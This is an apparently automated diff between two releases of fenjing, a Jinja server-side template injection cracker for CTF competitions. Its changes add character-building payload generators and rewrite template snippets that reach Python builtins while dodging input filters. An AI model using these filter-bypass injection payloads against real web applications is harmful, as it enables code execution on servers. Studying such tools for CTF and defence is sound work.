# Comparing `tmp/fenjing-0.3.6.tar.gz` & `tmp/fenjing-0.3.7.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "fenjing-0.3.6.tar", last modified: Mon May 22 14:28:14 2023, max compression
+gzip compressed data, was "fenjing-0.3.7.tar", last modified: Mon May 29 05:54:01 2023, max compression
```

## Comparing `fenjing-0.3.6.tar` & `fenjing-0.3.7.tar`

### file list

```diff
@@ -1,35 +1,35 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-22 14:28:14.067323 fenjing-0.3.6/
--rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-22 14:28:00.000000 fenjing-0.3.6/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      114 2023-05-22 14:28:00.000000 fenjing-0.3.6/MANIFEST.in
--rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-05-22 14:28:14.067323 fenjing-0.3.6/PKG-INFO
--rwxr-xr-x   0 runner    (1001) docker     (123)     6115 2023-05-22 14:28:00.000000 fenjing-0.3.6/README.md
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-22 14:28:00.000000 fenjing-0.3.6/VERSION
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-22 14:28:14.063323 fenjing-0.3.6/fenjing/
--rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)     8080 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/cli.py
--rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/colorize.py
--rw-r--r--   0 runner    (1001) docker     (123)      838 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/config_payload.py
--rw-r--r--   0 runner    (1001) docker     (123)     1532 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/const.py
--rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/exceptions.py
--rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/form.py
--rw-r--r--   0 runner    (1001) docker     (123)     5614 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/form_cracker.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     4234 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/full_payload_gen.py
--rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/int_vars.py
--rw-r--r--   0 runner    (1001) docker     (123)    28571 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/payload_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     1640 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/requester.py
--rw-r--r--   0 runner    (1001) docker     (123)     1180 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/scan_url.py
--rw-r--r--   0 runner    (1001) docker     (123)      941 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/shell_payload.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-22 14:28:14.067323 fenjing-0.3.6/fenjing/templates/
--rw-r--r--   0 runner    (1001) docker     (123)     9139 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/templates/index.html
--rw-r--r--   0 runner    (1001) docker     (123)     3242 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/waf_func_gen.py
--rw-r--r--   0 runner    (1001) docker     (123)     9104 2023-05-22 14:28:00.000000 fenjing-0.3.6/fenjing/webui.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-22 14:28:14.063323 fenjing-0.3.6/fenjing.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-05-22 14:28:14.000000 fenjing-0.3.6/fenjing.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      604 2023-05-22 14:28:14.000000 fenjing-0.3.6/fenjing.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-22 14:28:14.000000 fenjing-0.3.6/fenjing.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       36 2023-05-22 14:28:14.000000 fenjing-0.3.6/fenjing.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-22 14:28:14.000000 fenjing-0.3.6/fenjing.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       36 2023-05-22 14:28:00.000000 fenjing-0.3.6/requirements.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-22 14:28:14.067323 fenjing-0.3.6/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)      944 2023-05-22 14:28:00.000000 fenjing-0.3.6/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-29 05:54:01.587361 fenjing-0.3.7/
+-rw-r--r--   0 runner    (1001) docker     (123)    16725 2023-05-29 05:53:44.000000 fenjing-0.3.7/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      114 2023-05-29 05:53:44.000000 fenjing-0.3.7/MANIFEST.in
+-rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-05-29 05:54:01.587361 fenjing-0.3.7/PKG-INFO
+-rwxr-xr-x   0 runner    (1001) docker     (123)     6115 2023-05-29 05:53:44.000000 fenjing-0.3.7/README.md
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-29 05:53:44.000000 fenjing-0.3.7/VERSION
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-29 05:54:01.587361 fenjing-0.3.7/fenjing/
+-rwxr-xr-x   0 runner    (1001) docker     (123)      202 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       60 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     8080 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/cli.py
+-rw-r--r--   0 runner    (1001) docker     (123)      800 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/colorize.py
+-rw-r--r--   0 runner    (1001) docker     (123)      838 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/config_payload.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1586 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/const.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)       37 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/exceptions.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2670 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/form.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5625 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/form_cracker.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     4184 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/full_payload_gen.py
+-rwxr-xr-x   0 runner    (1001) docker     (123)     2846 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/int_vars.py
+-rw-r--r--   0 runner    (1001) docker     (123)    30746 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/payload_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1640 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/requester.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1180 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/scan_url.py
+-rw-r--r--   0 runner    (1001) docker     (123)      941 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/shell_payload.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-29 05:54:01.587361 fenjing-0.3.7/fenjing/templates/
+-rw-r--r--   0 runner    (1001) docker     (123)     9139 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/templates/index.html
+-rw-r--r--   0 runner    (1001) docker     (123)     3242 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/waf_func_gen.py
+-rw-r--r--   0 runner    (1001) docker     (123)     9104 2023-05-29 05:53:44.000000 fenjing-0.3.7/fenjing/webui.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-29 05:54:01.587361 fenjing-0.3.7/fenjing.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     6552 2023-05-29 05:54:01.000000 fenjing-0.3.7/fenjing.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      604 2023-05-29 05:54:01.000000 fenjing-0.3.7/fenjing.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-29 05:54:01.000000 fenjing-0.3.7/fenjing.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       36 2023-05-29 05:54:01.000000 fenjing-0.3.7/fenjing.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        8 2023-05-29 05:54:01.000000 fenjing-0.3.7/fenjing.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       36 2023-05-29 05:53:44.000000 fenjing-0.3.7/requirements.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-29 05:54:01.587361 fenjing-0.3.7/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)      944 2023-05-29 05:53:44.000000 fenjing-0.3.7/setup.py
```

### Comparing `fenjing-0.3.6/LICENSE` & `fenjing-0.3.7/LICENSE`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/PKG-INFO` & `fenjing-0.3.7/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.3.6
+Version: 0.3.7
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.3.6/README.md` & `fenjing-0.3.7/README.md`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/cli.py` & `fenjing-0.3.7/fenjing/cli.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/colorize.py` & `fenjing-0.3.7/fenjing/colorize.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/config_payload.py` & `fenjing-0.3.7/fenjing/config_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/const.py` & `fenjing-0.3.7/fenjing/const.py`

 * *Files 8% similar despite different names*

```diff
@@ -8,14 +8,15 @@
 STRING_STRING_CONCNAT = "string_string_concat"
 STRING_PERCENT = "string_percent"
 STRING_PERCENT_LOWER_C = "string_percent_lower_c"
 STRING_UNDERLINE = "string_underline"
 STRING_LOWERC = "string_lower_c"
 STRING_MANY_PERCENT_LOWER_C = "string_many_percent_lower_c"
 STRING_MANY_FORMAT_C = "string_many_format_c"
+CHAR = "char"
 STRING = "string"
 FORMULAR_SUM = "formular_sum"
 ATTRIBUTE = "attribute"
 ITEM = "item"
 CLASS_ATTRIBUTE = "class_attribute"
 CHAINED_ATTRIBUTE_ITEM = "chained_attribute_item"
 EVAL_FUNC = "eval_func"
@@ -33,14 +34,16 @@
     "integer",
     "string_string_concat",
     "string_percent",
     "string_percent_lower_c",
     "string_underline",
     "string_lower_c",
     "string_many_percent_lower_c",
+    "string_many_format_c",
+    "char",
     "string",
     "formular_sum",
     "attribute",
     "item",
     "class_attribute",
     "chained_attribute_item",
     "eval_func",
```

### Comparing `fenjing-0.3.6/fenjing/form.py` & `fenjing-0.3.7/fenjing/form.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/form_cracker.py` & `fenjing-0.3.7/fenjing/form_cracker.py`

 * *Files 1% similar despite different names*

```diff
@@ -127,15 +127,15 @@
             })
             return None
 
         is_test_success = None  # payload测试成功时为True, 失败时为False, 无法测试为None
         if will_print:
             if self.test_input(input_field, payload):
                 logger.info(
-                    f"{colored('green', 'Success!')} Now we can generate payloads.")
+                    f"{colored('green', 'Success!', bold=True)} Now we can generate payloads.")
                 is_test_success = True
             else:
                 logger.info(
                     f"{colored('yellow', 'Test Payload Failed', bold=True)}! Generated payloads might be useless.")
         else:
             logger.info(
                 f"Input {input_field} looks great, but we WON'T SEE the execution result! " +
```

### Comparing `fenjing-0.3.6/fenjing/full_payload_gen.py` & `fenjing-0.3.7/fenjing/full_payload_gen.py`

 * *Files 8% similar despite different names*

```diff
@@ -14,19 +14,19 @@
     if len(ints) == 0:
         logger.warning("No IntVars For YOU!")
     return payload, dict(zip(var_names, ints))
 
 
 def get_str_context(waf_func):
     str_vars = [
-        ("un", "_", "{%set un=(lipsum|escape|batch(22)|list|first|last)%}"),
-        ("perc", "%", "{%set perc=(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
-         "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
-         "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
-         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))%}"),
+        ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
+        ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
+         "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
+         "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
+         "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
         # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
     ]
     str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
     return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}
 
 
 def get_outer_pattern(waf_func):
```

### Comparing `fenjing-0.3.6/fenjing/int_vars.py` & `fenjing-0.3.7/fenjing/int_vars.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/payload_gen.py` & `fenjing-0.3.7/fenjing/payload_gen.py`

 * *Files 7% similar despite different names*

```diff
@@ -123,15 +123,15 @@
                 logger.info("{great}, we generate {gen_type}({args_repl})".format(
                     great=colored("green", "Great"),
                     gen_type=colored("yellow", gen_type, bold=True),
                     args_repl=colored("yellow", ", ".join(repr(arg)
                                       for arg in args)),
                 ))
             return payload
-        logger.warning("{failed} generating {gen_type}({args_repl})".format(
+        logger.warning("{failed} generating {gen_type}({args_repl}), it might not be an issue.".format(
             failed=colored("red", "failed"),
             gen_type=gen_type,
             args_repl=", ".join(repr(arg) for arg in args),
         ))
         self.cache_add(gen_type, *args, result=None)
         return None
 
@@ -650,14 +650,67 @@
     ).partition("LOWERC")
     return [
         (LITERAL, parts[0]),
         (STRING_LOWERC, ),
         (LITERAL, parts[2])
     ]
 
+# ---
+
+@req_gen
+def gen_char_literal1(context, c):
+    return [
+        (LITERAL, f"'{c}'" if c != "'" else "'\\''")
+    ]
+
+@req_gen
+def gen_char_literal2(context, c):
+    return [
+        (LITERAL, f'"{c}"' if c != '"' else '"\\""')
+    ]
+
+@req_gen
+def gen_char_select(context, c):
+    char_patterns = {
+        "((dict|trim|list)[INDEX])": {
+            1: "c", 2: "l", 3: "a", 4: "s", 5: "s", 6: " ", 8: "d", 9: "i", 10: "c", 11: "t"
+        },
+        "(({}|select()|trim|list)[INDEX])": {
+            1: "g", 2: "e", 3: "n", 4: "e", 5: "r", 6: "a", 7: "t", 8: "o", 9: "r", 10: " ", 
+            11: "o", 12: "b", 13: "j", 14: "e", 15: "c", 16: "t", 17: " ", 18: "s", 19: "e", 20: 
+            "l", 21: "e", 22: "c", 23: "t", 24: "_", 25: "o", 26: "r", 27: "_", 28: "r", 29: "e", 30: "j", 
+            31: "e", 32: "c", 33: "t", 34: " ", 35: "a", 36: "t"
+        },
+        "((lipsum|trim|list)[INDEX])": {
+            1: "f", 2: "u", 3: "n", 4: "c", 5: "t", 6: "i", 7: "o", 8: "n", 9: " ", 10: "g", 
+            11: "e", 12: "n", 13: "e", 14: "r", 15: "a", 16: "t", 17: "e", 18: "_", 19: "l", 20: "o", 
+            21: "r", 22: "e", 23: "m", 24: "_", 25: "i", 26: "p", 27: "s", 28: "u", 29: "m", 30: " ", 
+            31: "a", 32: "t", 33: " ", 34: "0", 35: "x", 36: "7"
+        },
+        "((()|trim|list)[INDEX])": {0: '(', 1: ')'},
+    }
+    for pattern, d in char_patterns.items():
+        for index, value in d.items():
+            if value == c:
+                return [
+                    (LITERAL, pattern.replace("INDEX", str(index)))
+                ]
+    return [
+        (UNSATISFIED, )
+    ]
+
+@req_gen
+def gen_char_dict(context, c):
+    if not re.match("[0-9A-Za-z]", c):
+        return [
+            (UNSATISFIED, )
+        ]
+    return [
+        (LITERAL, f"(dict({c}=x)|join)")
+    ]
 
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
 @req_gen
 def gen_string_1(context: dict, value: str):
     chars = [c if c != "\'" else "\\\'" for c in value]
@@ -839,14 +892,32 @@
             (UNSATISFIED, )
         ]
 
     return [
         (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in value)))
     ]
 
+@req_gen
+def gen_string_chars(context: dict, value: str):
+    ans: List[Any] = [
+        (LITERAL, "("),
+        (CHAR, value[0])
+    ]
+    for c in value[1:]:
+        ans.append(
+            (STRING_STRING_CONCNAT, )
+        )
+        ans.append(
+            (CHAR, c)
+        )
+    ans.append(
+        (LITERAL, ")"),
+    )
+    return ans
+
 
 @req_gen
 def gen_string_formatpercent(context: dict, value: str):
     # (('%c'*n)%(97,98,99))
     req = []
     req.append(
         (LITERAL, "((")
```

### Comparing `fenjing-0.3.6/fenjing/requester.py` & `fenjing-0.3.7/fenjing/requester.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/scan_url.py` & `fenjing-0.3.7/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/shell_payload.py` & `fenjing-0.3.7/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/templates/index.html` & `fenjing-0.3.7/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/waf_func_gen.py` & `fenjing-0.3.7/fenjing/waf_func_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing/webui.py` & `fenjing-0.3.7/fenjing/webui.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/fenjing.egg-info/PKG-INFO` & `fenjing-0.3.7/fenjing.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.3.6
+Version: 0.3.7
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
```

### Comparing `fenjing-0.3.6/fenjing.egg-info/SOURCES.txt` & `fenjing-0.3.7/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.3.6/setup.py` & `fenjing-0.3.7/setup.py`

 * *Files identical despite different names*

